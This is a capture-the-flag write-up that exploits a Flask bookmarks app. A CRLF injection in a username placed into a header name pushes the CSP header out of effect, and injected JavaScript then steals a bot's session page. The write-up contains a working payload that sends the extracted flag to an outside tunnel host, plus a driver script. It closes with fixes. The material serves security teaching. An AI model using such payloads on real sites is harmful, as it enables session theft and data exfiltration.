# Bookmarks - Breaking CSP with CRLF

**Category:** Web Exploitation
**Flag:** `FLAG{...}`

## The Challenge

Bookmarks was a Flask application for managing bookmarks. Users could register, login, and save bookmarks to their dashboard. The interesting part was that it had a bot , when you reported a URL, a headless browser would visit it, register as a user with the flag as the username, log in, and browse around.

My goal was to steal that username (the flag) from the bot's session.

## The Bot's Behavior

Looking at the bot code, I could see the sequence:

1. Bot visits my reported URL
2. Waits 5 seconds
3. Navigates to `/register` and creates an account with FLAG as the username
4. Navigates to `/login` and logs in
5. The dashboard displays "Welcome, FLAG!"

The flag would appear on the dashboard, but only the bot could see it. I needed to somehow read the bot's dashboard.

## Finding the Vulnerability

I examined the Flask application code and found something interesting in the `/dashboard` route:

```python
@app.route("/dashboard", methods=['GET'])
def dashboard():
    user_id = session.get("user_id")
    username = None
    with sqlite3.connect(DB_NAME) as conn:
        cur = conn.execute("SELECT username FROM users WHERE id = ?", (user_id,))
        user = cur.fetchone()
        username = user[0] if user else None

    rendered = render_template("dashboard.html", username=username)
    response = make_response(rendered)
    response.headers['X-User-' + username] = user_id  # VULNERABLE LINE

    return response
```

The username was being inserted directly into an HTTP response header name: `X-User-{username}`.

If I registered with a username containing CRLF characters (`\r\n`), I could:
1. End the current header
2. Inject new headers
3. End ALL headers with `\r\n\r\n`
4. Inject content into the response body

## Testing CRLF Injection

I created a test account with this username:

```
test\r\n\r\n<h1>INJECTED</h1><!--
```

When I visited `/dashboard`, the response looked like this:

```http
HTTP/1.1 200 OK
X-User-test

<h1>INJECTED</h1><!--: 12345
Content-Security-Policy: default-src 'none'; style-src 'self';
... rest of response
```

The CSP header ended up in the response body, not as an actual header. This meant CSP wasn't being enforced, and I could execute JavaScript.

## The Timing Challenge

My attack needed careful timing:

1. At 0 seconds: Bot visits my exploit page
2. At 0 seconds: My page opens a popup and logs in as my CRLF user
3. At 2 seconds: Popup navigates to `/dashboard` with my injected script
4. At 5 seconds: Bot (main window) navigates to `/register`
5. At 6 seconds: Bot logs in - session cookie is now set
6. At 8-12 seconds: My injected script runs `fetch("/dashboard")` using the shared session cookie

The key insight was that popup windows share the same cookie jar as their opener. Even though I couldn't read `window.opener.document` due to same-origin policy restrictions after navigation, I could still make `fetch()` requests that used the bot's session cookie.

## The Exploit

I created a malicious username with injected JavaScript:

```python
def build_malicious_username():
    script = """
var T="https://my-tunnel-url.com";
function P(m){new Image().src=T+"/c?m="+encodeURIComponent(m);}
P("Script loaded");
function go(){
    P("Fetching dashboard");
    fetch("/dashboard").then(function(r){return r.text();}).then(function(h){
        var m=h.match(/Welcome,([^<]+)/);
        if(m) P("FLAG:"+m[1].trim());
        else P("No match:"+h.substr(0,100));
    }).catch(function(e){P("Error:"+e);});
}
setTimeout(go,8000);
setTimeout(go,10000);
setTimeout(go,12000);
P("Timers set");
""".replace("\n", "")

    return f"user\r\n\r\n<script>{script}</script><!--"
```

My exploit page opened a popup, logged in as the CRLF user, then navigated the popup to `/dashboard`. The navigation triggered the CRLF injection, my script loaded (CSP bypassed), and after waiting for the bot to log in, my script fetched `/dashboard` and extracted the flag from the Welcome message.

The complete attack flow:

```python
#!/usr/bin/env python3
import http.server
import requests
import base64
import threading
import time
import random
import string

TARGET_URL = "http://65.109.202.184"
INTERNAL_ORIGIN = "http://web"
TUNNEL_URL = "https://your-tunnel.trycloudflare.com"

def main():
    # Step 1: Register CRLF user
    print("[1] Registering CRLF user...")
    requests.post(f"{TARGET_URL}/register",
                  data={"username": MALICIOUS_USERNAME, "password": PASSWORD})

    # Step 2: Verify injection works
    print("[2] Verifying injection...")
    s = requests.Session()
    s.post(f"{TARGET_URL}/login",
           data={"username": MALICIOUS_USERNAME, "password": PASSWORD})
    r = s.get(f"{TARGET_URL}/dashboard")

    if "<script>" in r.text:
        print("    [+] CRLF injection verified!")
    else:
        print("    [-] Injection failed!")
        return

    # Step 3: Start exploit server
    print("[3] Starting server...")
    server = socketserver.TCPServer(("0.0.0.0", 8000), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()

    # Step 4: Trigger bot
    print("[4] Triggering bot...")
    requests.post(f"{TARGET_URL}/report",
                  data={"url": f"{TUNNEL_URL}/exploit.html"})

    print("\n[*] Waiting for flag...\n")

    while True:
        time.sleep(1)
```

After a few seconds, I saw the callback with the flag:

```
[>] Script loaded
[>] Timers set
[>] Fetching dashboard
[>] FLAG:FLAG{...}
```

## takeaways

**Defense:** The vulnerability existed because:
1. User input (username) was directly concatenated into HTTP header names
2. No validation for special characters like `\r` and `\n`
3. Python's `response.headers[key] = value` doesn't sanitize the key

The fix would be to either:
- Sanitize all user input that goes into headers
- Use a safe templating method for headers
- Validate usernames to reject control characters

